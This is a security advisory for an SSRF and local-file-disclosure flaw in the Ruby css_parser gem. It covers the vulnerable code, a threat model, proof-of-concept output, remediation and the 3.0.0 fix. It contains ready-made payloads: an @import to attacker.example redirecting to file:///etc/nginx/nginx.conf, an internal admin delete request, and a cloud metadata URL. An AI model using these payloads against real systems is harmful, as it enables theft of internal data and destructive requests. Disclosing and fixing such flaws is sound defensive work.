# [H] Ruby CSS Parser: SSRF and Local File Disclosure in `CssParser::Parser#read_remote_file`

## Summary
Severity: High
Advisory: GHSA-9pmc-p236-855h
CVE: CVE-2026-53727
CWE: CWE-918
Ecosystem: RubyGems
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-07-09
Source: https://github.com/advisories/GHSA-9pmc-p236-855h
Type: github-advisory

## Affected
- RubyGems: `css_parser` — affected >=0 <3.0.0

## Details
## Summary

`CssParser::Parser#read_remote_file` (and therefore `load_uri!`, and the `@import`-following branch of `add_block!`) issues HTTP/HTTPS requests against any host, port and URI it is handed, with no scheme allowlist, no host / IP filtering, and no protection against link-local, loopback or RFC‑1918 addresses. `Location:` redirects are followed recursively back into the same function, which **also services `file://` URIs**, so a single attacker-controlled HTTP redirect upgrades the bug from SSRF to arbitrary local file disclosure.

In practice, any consumer of `css_parser` that hands it attacker‑influenced CSS together with a `base_uri:` option — Premailer being the canonical example — is exposed. The attacker only needs the ability to land one `@import url(...)` in the CSS that the host application parses.

## Vulnerable code

[`lib/css_parser/parser.rb#L613-L687`](https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L613-L687):

```ruby
def read_remote_file(uri) # :nodoc:
  ...
  begin
    uri = Addressable::URI.parse(uri.to_s)

    if uri.scheme == 'file'
      # local file
      path = uri.path
      path.gsub!(%r{^/}, '') if Gem.win_platform?
      src = File.read(path, mode: 'rb')        # <-- arbitrary local read
    else
      # remote file
      if uri.scheme == 'https'
        uri.port = 443 unless uri.port
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = true
      else
        http = Net::HTTP.new(uri.host, uri.port)  # <-- arbitrary host:port
      end

      res = http.get(uri.request_uri, ...)
      ...
      elsif res.code.to_i >= 300 and res.code.to_i < 400
        unless res['Location'].nil?
          return read_remote_file Addressable::URI.parse(...)  # <-- cross-scheme redirect
        end
      end
    ...
```

There is **no validation** of `uri.host`, `uri.scheme`, or the resolved IP address — neither before the HTTP request, nor before the recursive call on the `Location` header.

The user-facing entry points that reach this sink are:

- [`Parser#load_uri!`](https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L489-L516) — directly calls `read_remote_file` (line 513).
- [`Parser#add_block!`](https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L117-L162) — when invoked with `base_uri:` and the default `import: true`, scans the CSS for `@import url(...)` rules and resolves each one through `load_uri!` (line 150).

## Threat model and scope

| Capability | Reachable? | Notes |
|---|---|---|
| Arbitrary outbound `http://` / `https://` GET to any host:port reachable from the server | ✅ | No host, IP, port or scheme allowlist. Works against loopback, RFC‑1918, link‑local (169.254/16, AWS / GCP / Azure IMDS), and Docker / k8s service IPs. |
| Recovering the response body | ✅ (conditional) | The body is fed back into `add_block!`. Any bytes that form `selector { decl }` round‑trip out via `Parser#each_selector` / `to_s`. A consumer that emits the parsed CSS (e.g. Premailer inlining into HTML) leaks the body to the original attacker. |
| Local file read via cross-scheme redirect (`Location: file://...`) | ⚠️ partial | Redirect is followed without checking the new scheme; the recursive call services `file://` with `File.read`. The read itself executes against any path the Ruby process can open. **Content recovery via the parser API is constrained by CSS grammar** — see "File-disclosure scope" below. |
| File-existence oracle | ✅ | With default `io_exceptions: true`, missing paths raise `CssParser::RemoteFileError` and existing paths return silently. An attacker can iterate `file://` targets to enumerate filesystem layout, usernames, installed software, etc. |
| Side-effecting GETs against unprotected internal admin endpoints | ✅ | Even with a non‑CSS response, the request still fires. Internal services that act on GET (legacy admin panels, debug endpoints, cache busters, queue triggers) execute. |
| Forced gzip / deflate decompression (DoS / decompression bomb) | ✅ | `Accept-Encoding: gzip` is hardcoded (line 650) and the body is decompressed with `Zlib::GzipReader` / `Zlib::Inflate` (lines 665-672). An attacker server can return a small gzipped payload that decompresses to multiple GB. |
| HTTPS internal targets with self-signed / private CA certs | ⚠️ | `Net::HTTP#use_ssl = true` defaults to `VERIFY_PEER`, so internal HTTPS hosts with private certs will fail the SSL handshake. Plain HTTP, and HTTPS hosts whose certs chain to a CA trusted by the process, are fully exploitable. |
| Smuggling other TCP protocols (Redis, Memcached, etc.) via the HTTP client | ⚠️ | `Net::HTTP` writes a real HTTP request line, so Redis / Memcached won't accept it. The TCP connect itself does occur, which can still trigger logs, port-scan effects, and connection-state side effects in firewalled environments. |

### File-disclosure scope (cross-scheme redirect leg)

The `file://` branch of `read_remote_file` does an unconditional `File.read`, but the contents are then handed back to `add_block!` and fed through the CSS tokenizer ([`parse_block_into_rule_sets!`](https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L342-L480)). Only content that fits the grammar at the lexer level survives:

- **Selector slot** — any text accumulated before the next `{` becomes the selector for that rule (including text spanning multiple lines).
- **Declarations slot** — only `prop: value;` pairs inside `{ ... }` are retained. The `Declarations` parser splits on `;`, requires `:`, and drops anything else ([rule_set.rb#L655-L681](https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/rule_set.rb#L655-L681)).
- A rule is only added when the *raw* declarations string between `{` and `}` is non-empty ([parser.rb#L396](https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L396)).

Empirical results against vulnerable 2.2.0 with `Location: file://<path>`:

| File contents | Recoverable through `to_s` / `each_selector`? |
|---|---|
| `root:x:0:0:root:/root:/bin/bash\napi_key=…` (no braces) | nothing |
| `{"AccessKeyId":"AKIA…","Secret":"wJalr…"}` (JSON, leading `{`) | nothing via `to_s`; partial leak via `each_rule_set` (empty selector + one parsed declaration) |
| `SECRET=eyJhbGc… {}` (empty braces) | nothing (rule not added — raw decls empty) |
| `api_key=…\ndatabase{host:db.internal;pw:hunter2;}` | full leak: selector = `api_key=… database`, decls = `host: db.internal; pw: hunter2` |
| nginx / HCL-style config: `name { key: value; }` | full leak of both slots |

In practice this means **high-value targets that aren't CSS-shaped — TLS keys, SSH keys, JWTs, `.env` files (`KEY=VALUE` lines), `/etc/passwd`, binary content — do not leak their bytes through the parser API**. Configuration files written in block-style DSLs (nginx, HCL/Terraform, Caddy, etc.) leak heavily. The `File.read` itself always executes, which is enough to (a) act as a file-existence oracle and (b) cause resource exhaustion on large pseudo-files like `/dev/zero`.

The **stronger** recovery channel is the SSRF leg, not file disclosure: when the response comes from an internal HTTP service, Premailer-style consumers serialize the parsed CSS back into rendered HTML/email output, and any CSS-shaped bytes in the response surface there.

### Is it "blind"?

It is *not* a classic blind SSRF. The bug has two recovery channels:

1. **Application output.** The library is most commonly driven by Premailer, which writes the parsed CSS back into the rendered HTML. Any response bytes that happen to form CSS rules are emitted into the output document and therefore visible to whoever receives the rendered output. Internal endpoints frequently return content that parses as CSS by accident — anywhere `{ ... }` appears (JSON objects sit just inside that envelope; many config-dump endpoints look the same) the contents become exfiltratable rules.
2. **Side effects on the destination.** Because the request actually leaves the server, an attacker who controls the destination URL sees the request unconditionally (URL, headers, source IP, user-agent from `@options[:user_agent]`). And when the destination is an internal service the attacker does *not* control, the GET is nonetheless executed against that service.

## Reproduction

A minimal, self-contained reproducer is attached as [`poc.rb`](./poc.rb). It spins up two local WEBrick servers (a fake "internal" service on 127.0.0.1:18080 and an attacker-controlled redirector on 127.0.0.1:18081) and runs four scenarios against `css_parser` 2.2.0.

```
$ gem install css_parser -v 2.2.0
$ gem install webrick     # not bundled with Ruby >= 3.0
$ ruby poc.rb
```

### Actual output

```
========================================================================
POC 1 — SSRF: force a GET to an internal-only HTTP endpoint and
         recover the response body via the parser API
========================================================================
Attacker-supplied CSS:
  @import url("http://127.0.0.1:18080/admin-credentials");
Internal endpoint hit count: 1  (should be >= 1)
Rules parsed from the internal response:
  .creds { content: "AKIAFAKEINTERNALONLY:wJalrXUtnFEMIFAKESECRET"; }

========================================================================
POC 2 — Cross-scheme redirect: HTTP 302 → file:// → local file read
========================================================================
Local secret file: /tmp/css_parser_nginx.conf
Attacker-supplied CSS:
  @import url("http://127.0.0.1:18081/to-local-file");
Rules parsed from the redirect target (a local file):
  server { listen: 443; server_name: internal.example.com;
           ssl_certificate_key: /etc/nginx/ssl/SECRET_PRIVATE_KEY.pem;
           proxy_pass: http://10.0.0.42:8080; }

========================================================================
POC 3 — Direct load_uri! also affected
========================================================================
parser.load_uri!('http://127.0.0.1:18080/admin-credentials')
  .creds { content: "AKIAFAKEINTERNALONLY:wJalrXUtnFEMIFAKESECRET"; }

========================================================================
POC 4 — Pure SSRF side-effect (works even when the response is not CSS-shaped)
========================================================================
Attacker-supplied CSS:
  @import url("http://127.0.0.1:18080/admin/delete-user?id=42");
Internal side-effect endpoint reached? true
Request observed by internal service: "/admin/delete-user?id=42"
```

### Minimal one-line triggers

The smallest possible attacker payload is a single `@import` rule. The following three examples are ordered from "highest practical impact" to "least", because the parser's data-recovery surface depends on the shape of the response (see the "File-disclosure scope" table above):

**1. Internal block-DSL config via cross-scheme redirect → file://** — nginx, HCL/Terraform, Caddy, BIND, etc. all use `name { key value; }` block syntax, which round-trips cleanly out of the css_parser API. An attacker who controls `attacker.example` redirects to the local file:

```css
/* attacker.css */
@import url("https://attacker.example/r");
```

```
GET https://attacker.example/r
→ 302 Location: file:///etc/nginx/nginx.conf
```

Result: the full `server { listen 443 ssl; ssl_certificate_key …; … }` block is parsed into selectors and declarations and surfaces via `parser.to_s`, which Premailer-style consumers re-emit into rendered output.

**2. Side-effecting internal admin GET** — even when the response is not CSS-shaped, the request still executes against the internal service:

```css
@import url("http://internal-admin.local/api/v1/users/42?action=delete");
```

No data exfiltration is required for this to be a vulnerability: the attacker has achieved an authenticated-from-localhost GET against an internal control-plane endpoint.

**3. Internal HTTP service whose body happens to be CSS-shaped** — a status / debug page or a config endpoint that emits `block { key: value; }` text. Same recovery profile as case (1).

```css
@import url("http://internal-svc.local/debug/config");
```

All three payloads are parsed via:

```ruby
require 'css_parser'
parser = CssParser::Parser.new
parser.add_block!(File.read('attacker.css'), base_uri: 'http://attacker.example/')
```

`base_uri:` is the only required option — it is what enables the `@import`-following code path ([parser.rb:147-150](https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L147-L150)). Premailer always sets `base_uri:` when given an HTML document that has a URL, so every Premailer pipeline that processes attacker-influenced HTML/CSS reaches this sink.

> Note on the EC2 IMDS / `169.254.169.254` example often associated with SSRF write-ups: `@import url("http://169.254.169.254/latest/meta-data/iam/security-credentials/")` **does fire the request**, but the role-list response is plain text with no `{` characters and is therefore discarded by the CSS tokenizer — nothing surfaces via `parser.to_s` or `each_selector`. The per-role credentials JSON endpoint *partially* leaks the body as a single declaration value, but only via `each_rule_set` / `each_declaration`, which Premailer does not expose to its output. IMDSv2 is not exploitable at all (no `PUT` support, no header injection). The bug is still serious — just not via the IMDS path the way an XHR/curl-based SSRF would be.

### Standalone `file://` via `load_uri!` (no HTTP redirect needed)

Independent of the SSRF / redirect chain above, `Parser#load_uri!` itself executes `File.read` against any `file://` URI it is handed, and `Parser#add_block!(css, base_uri: 'file:///some/dir/')` resolves `@import` against that base. Any application that hands an attacker-influenced URI (or an `@import` URL with an attacker-influenced base) to either method has a local file read primitive — no HTTP, no redirect, no `ssrf_filter`-bypass technique required.

```ruby
require 'css_parser'
parser = CssParser::Parser.new
parser.load_uri!('file:///etc/nginx/nginx.conf')  # direct File.read
```

…or via a CSS-driven path with an attacker-controlled `@import`:

```ruby
parser = CssParser::Parser.new
parser.add_block!(File.read('attacker.css'), base_uri: 'file:///etc/')
# attacker.css contains: @import url("nginx/nginx.conf");
```

The recoverable-content rules in the "File-disclosure scope" subsection above apply identically here — the bytes flow through the same `add_block!` tokenizer regardless of whether they arrived via redirect or directly. Applications that don't accept HTTP URLs from users but *do* construct `file://` URIs from any user-supplied component are exposed.

This is a separate weakness (`CWE-73`) from the SSRF leg (`CWE-918`) and is gated by its own opt-in flag in 3.0.0 (see "Fix as shipped in 3.0.0" below).

## Suggested remediation

1. **Reject non-`http(s)` schemes in `read_remote_file`.** Before the recursive redirect call at line 661 and at the top of `read_remote_file`, require `uri.scheme.in?(%w[http https])`. The `file://` branch at lines 635-639 should be removed from `read_remote_file` entirely — local files are already handled by `load_file!`, so keeping a `file://` branch in the *remote* read path serves no purpose other than enabling this redirect bypass.
2. **Validate the resolved address against private / link-local / loopback ranges**, behind an opt-in option (e.g. `allow_local_uris: false`). At minimum, resolve `uri.host` and reject results in `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`, `fe80::/10`, and unspecified addresses. The check must be done *after* DNS resolution and re-checked on every redirect hop, otherwise DNS rebinding and CNAME redirection trivially bypass it.
3. **Re-validate every redirect hop.** The recursive call at line 661 currently inherits no validation. Apply the same scheme / host / address checks as step 1-2 before recursing.
4. **Bound the response size** read from `http.get` and decompressed at lines 665-672, to mitigate decompression bombs.
5. **Document the security posture.** `load_uri!` / `add_block!` with `base_uri:` should be documented as security-sensitive, with a clear recommendation that any caller exposing them to untrusted CSS use the allowlist option above.

Many of these issues could be generally remediated by replacing the network logic with the [ssrf_filter](https://github.com/arkadiyt/ssrf_filter) gem.

## Fix as shipped in 3.0.0

The remediation lands as two structural changes plus two new independent opt-in flags. The structural changes apply unconditionally; the flags let callers re-enable specific subsets of the old behaviour where they have a legitimate need.

### Structural changes (always on, no opt-out)

- **Outbound HTTP goes through [`ssrf_filter`](https://github.com/arkadiyt/ssrf_filter) by default.** `ssrf_filter` resolves the hostname with `Resolv`, rejects unsafe IP ranges (loopback, RFC-1918, link-local, multicast, IPv6 ULAs, cloud metadata), enforces a `scheme_whitelist` of `%w[http https]`, and re-validates scheme and IP on every redirect hop. CNAME-to-private-IP and other DNS-rebinding-style bypasses are defeated by the resolved-IP check.
- **`file://` is no longer reachable from the remote-fetch path at all.** The `file://` handling was moved out of `read_remote_file` entirely into `load_uri!`, so a 3xx `Location: file://...` response cannot be followed regardless of how the parser is configured.
- **`Accept-Encoding: gzip` is no longer requested** by the remote-fetch path, removing the decompression-bomb surface that was called out as a separate mitigation item.

### New `Parser` options

Two independent off-by-default flags, mapping 1:1 to the two CWE classes:

| Option | Default | Gates | Threat class |
|---|---|---|---|
| `allow_local_network` | `false` | http(s) requests resolving to loopback / RFC-1918 / link-local / IMDS addresses | CWE-918 (SSRF) |
| `allow_file_uris` | `false` | `file://` URIs via `load_uri!` (and `@import` resolved against `file://` base_uri) | CWE-73 (LFI) |

Each flag is **independent**: setting `allow_local_network: true` does **not** permit `file://`, and `allow_file_uris: true` does **not** permit loopback HTTP. Callers grant exactly the threat surface they need open and nothing more.

`load_file!` — the explicit local-file API that takes a path (not a URI) — is unaffected by either flag, because the path comes from the caller's own code, not from a user-influenced URI.

### Upgrade notes

- **Premailer / email-rendering / link-preview pipelines**: no code changes required. The default-secure 3.0.0 configuration is exactly what you want — the same `Parser.new` instantiation now refuses SSRF and LFI attempts.
- **Test suites that fetch from `localhost` or a loopback fixture server**: pass `allow_local_network: true` on the relevant `Parser.new` calls.
- **Code that deliberately calls `parser.load_uri!('file://...')` or sets `base_uri: 'file://...'`**: pass `allow_file_uris: true`. Where possible, prefer migrating to `parser.load_file!(path)` instead — it's the explicit local-file API and is not subject to the URI gate.
- **Code that uses both** (e.g. integration tests against a local HTTP fixture *and* file:// fixtures): pass both, `Parser.new(allow_local_network: true, allow_file_uris: true)`.

The fix landed across these commits: `ba74c3c` (failing tests), `7d2ddf0` (implementation), `e0a1514` (defensive invariant guards), all merged.

## Credit

This vulnerability was reported by @JLLeitschuh of the @braze-inc security team. This vulnerability was originally discovered by the pentesters at @nccgroup.

## References
- https://github.com/premailer/css_parser/security/advisories/GHSA-9pmc-p236-855h
- https://github.com/premailer/css_parser
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/css_parser/CVE-2026-53727.yml
- https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-53727
